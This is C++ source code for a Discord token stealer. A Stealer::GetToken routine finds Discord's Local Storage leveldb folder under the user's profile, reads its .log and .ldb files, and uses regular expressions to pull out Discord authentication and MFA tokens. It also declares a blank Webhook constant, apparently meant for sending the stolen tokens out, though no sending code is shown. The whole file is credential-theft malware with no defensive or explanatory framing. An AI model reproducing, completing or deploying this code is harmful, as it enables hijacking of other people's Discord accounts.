#include "Stealer.h"
const char* Webhook = "";

using namespace std;


bool exists(const char* path) {
	DWORD ftyp = GetFileAttributesA(path);
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;

	return false;
}

std::string FetchUsername() {
	std::string username = getenv("USERPROFILE");
	return username;
}

std::vector<std::string> get_all_files_names_within_folder(std::string folder)
{
	std::vector<std::string> names;
	std::string search_path = folder + "/*.*";
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				names.push_back(fd.cFileName);
			}
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
	}
	return names;
}


string ReadFile(const string& fileName)
{
	ifstream ifs(fileName.c_str(), ios::in | ios::binary | ios::ate);

	ifstream::pos_type fileSize = ifs.tellg();
	if (fileSize < 0)
		return std::string();

		ifs.seekg(0, ios::beg);

	vector<char> bytes(fileSize);
	ifs.read(&bytes[0], fileSize);

	return string(&bytes[0], fileSize);
}


void Stealer::GetToken() {
	AccountInformation accountInfo;


	std::regex regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
	std::regex mfaregex("mfa\\.[\\w-]{84}");
	std::string UserPath = FetchUsername();
	std::string LocalStorage = "\\AppData\\Roaming\\discord\\Local Storage\\leveldb";
	if (!exists(UserPath.append(LocalStorage).c_str())) {
		std::cout << "Discord not found" << std::endl;
		std::cout << UserPath.append(LocalStorage) << std::endl;
	}
	std::cout << "Discord Found" << std::endl;
	std::cout << UserPath << std::endl;

	std::vector<std::string> FileNames = get_all_files_names_within_folder(UserPath);

	std::string log = ".log";
	std::string ldb = ".ldb";

	string Tokens;
	int Tokencount = 0;
	int MFATokencount = 0;

	for (int i = 0; i < FileNames.size(); i++) {
		if (!strstr(FileNames[i].substr(FileNames[i].length() - 4, FileNames[i].length()).c_str(), log.c_str()) && !strstr(FileNames[i].substr(FileNames[i].length() - 4, FileNames[i].length()).c_str(), ldb.c_str()))
			continue;

		std::string Content = ReadFile(UserPath + "\\" + FileNames[i]);
		std::smatch match;
		std::smatch MFAmatch;
		if (std::regex_search(Content, match, regex)) {
			Tokens.append(match.str(0) + "\n");
			break;
		}
		else if (std::regex_search(Content, MFAmatch, mfaregex)) {
			Tokens.append(MFAmatch.str(0) + "\n");
			break;
		}
		else {
			std::cout << "No Match\n";
			continue;
		}

	}
	cout << Tokens << endl;
	accountInfo.Token = Tokens;
}
